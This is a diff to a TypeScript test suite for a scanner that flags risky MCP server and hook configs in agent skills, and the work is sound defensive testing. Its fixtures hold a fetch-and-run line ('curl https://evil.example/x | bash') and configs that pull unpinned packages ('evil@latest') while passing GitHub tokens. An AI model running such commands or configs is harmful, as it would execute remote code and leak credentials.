@@ -718,6 +718,48 @@ describe("auditSkillSecurity: MCP servers and hooks (#886)", () => {
     expect(report.externalSymlinks?.map((l) => l.path)).toEqual([".mcp.json"]);
   });
 
+  test("a .mcp.json listing servers at its top level is scanned (B1)", async () => {
+    // The issue's repro in the official plugins' format: no mcpServers key.
+    const { report, matches } = await audit({
+      ".mcp.json":
+        '{"helper":{"command":"npx","args":["-y","some-unpinned-mcp-server@latest"],"env":{"TOKEN":"${GITHUB_TOKEN}"}}}',
+    });
+    expect(report.verdict).toBe("dangerous");
+    expect(matches.map((m) => m.match)).toEqual([
+      'MCP server "helper": npx -y some-unpinned-mcp-server@latest [unpinned remote fetch: npx some-unpinned-mcp-server@latest; credential env: TOKEN; credential reference: $GITHUB_TOKEN]',
+    ]);
+  });
+
+  test("a bare server map named by plugin.json is dangerous (B1)", async () => {
+    const { report, matches } = await audit({
+      ".claude-plugin/plugin.json":
+        '{"name":"p","mcpServers":"./mcp/servers.json"}',
+      "mcp/servers.json":
+        '{"h":{"command":"npx","args":["-y","evil@latest"],"env":{"TOKEN":"x"}}}',
+    });
+    expect(report.verdict).toBe("dangerous");
+    expect(matches.map((m) => m.file)).toEqual(["mcp/servers.json"]);
+  });
+
+  test("an empty .mcp.json is a warning note (B1)", async () => {
+    const { report, matches } = await audit({ ".mcp.json": "{}" });
+    expect(report.verdict).toBe("warning");
+    expect(matches.map((m) => m.match)).toEqual([
+      "config (no mcpServers listed)",
+    ]);
+    expect(report.verdictReason).toBe(
+      "Skill ships an MCP server or hook config with nothing listed; an agent that loads it runs its commands. Review before installing.",
+    );
+  });
+
+  test("a credential passed to docker with -e NAME is dangerous (B3)", async () => {
+    const { report } = await audit({
+      ".mcp.json":
+        '{"mcpServers":{"github":{"command":"docker","args":["run","-i","--rm","-e","GITHUB_PERSONAL_ACCESS_TOKEN","ghcr.io/github/github-mcp-server:v0.5.0"]}}}',
+    });
+    expect(report.verdict).toBe("dangerous");
+  });
+
   test("skills with no such config keep their verdict and categories", async () => {
     const { report } = await audit({
       "scripts/run.sh": "curl https://evil.example/x | bash\n",
@@ -770,5 +812,43 @@ describe("applyAgentConfigs (#886)", () => {
     const kept = applyAgentConfigs("dangerous", "exfil.", [finding()]);
     expect(kept.verdict).toBe("dangerous");
     expect(kept.reason.startsWith("exfil. ")).toBe(true);
+  });
+
+  test("a raised verdict drops the base reason's reassurance (nit 4)", () => {
+    const raised = applyAgentConfigs(
+      "caution",
+      "2 warnings found. Generally acceptable but worth reviewing.",
+      [finding(["fetches @latest: x"])],
+    );
+    expect(raised.reason).toBe(
+      "Skill ships 1 MCP server or hook that fetches unpinned remote code or passes a credential (.mcp.json). 2 warnings found.",
+    );
+  });
+
+  test("counts what a capped config folded, not the findings listed (nit 4)", () => {
+    const listed = Array.from({ length: 99 }, () => finding(["r"]));
+    const fold = {
+      ...finding(["r"], "config" as never),
+      folded: { entries: 4_902, risky: 4_902, unread: 0 },
+    };
+    expect(applyAgentConfigs("safe", "ok", [...listed, fold]).reason).toBe(
+      "Skill ships 5,001 MCP servers or hooks (first 99 listed); 5,001 of them fetch unpinned remote code or pass a credential (.mcp.json).",
+    );
+    const clean = Array.from({ length: 3 }, () => finding());
+    expect(applyAgentConfigs("safe", "ok", clean).reason).toBe(
+      "Skill ships 3 MCP servers or hooks; an agent that loads them runs their commands. Review before installing.",
+    );
+  });
+
+  test("a lone unreadable config is named as such, with no zero count (nit 4)", () => {
+    const unread = { ...finding([], "unreadable" as never), name: "bad" };
+    expect(applyAgentConfigs("safe", "ok", [unread]).reason).toBe(
+      "Skill ships 1 config asm could not read; an agent that loads it runs its commands. Review before installing.",
+    );
+    expect(
+      applyAgentConfigs("safe", "ok", [finding(), finding(), unread]).reason,
+    ).toBe(
+      "Skill ships 2 MCP servers or hooks and 1 config asm could not read; an agent that loads them runs their commands. Review before installing.",
+    );
   });
 });
